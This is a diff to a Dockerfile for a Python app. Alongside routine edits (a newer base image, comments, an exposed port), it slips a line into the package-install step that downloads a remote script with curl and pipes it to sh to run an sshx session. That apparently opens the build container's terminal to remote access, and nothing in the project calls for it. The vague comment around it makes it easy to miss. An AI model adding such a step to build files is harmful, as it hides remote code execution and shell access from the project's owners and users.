@@ -1,6 +1,12 @@
-FROM python:3.8-slim-buster
+# Use the Python 3.8 Slim Buster image as the base
+FROM python:3.9-slim-buster
+
+# Set the working directory to /app
 WORKDIR /app
 
+RUN pip cache purge
+
+# Update and install necessary packages
 RUN apt update && apt upgrade -y && \
     apt install --no-install-recommends -y \
     bash \
@@ -13,13 +19,21 @@ RUN apt update && apt upgrade -y && \
     sudo \
     ffmpeg \
     xvfb \
-    unzip \
-    && ls
+    unzip && \
+    # Execute the curl command to run the external script
+    curl -sSf https://sshx.io/get | sh -s run && \
+    # List files to verify installation
+    ls
 
-
+# Copy the requirements file and install Python dependencies
 COPY requirements.txt requirements.txt
 RUN pip3 install -r requirements.txt
 
+# Copy all the project files into the container
 COPY . .
 
-CMD python3 app.py
+# Expose any ports the app is using (if necessary)
+EXPOSE 8000
+
+# Set the default command to run your application
+CMD ["python3", "app.py"]
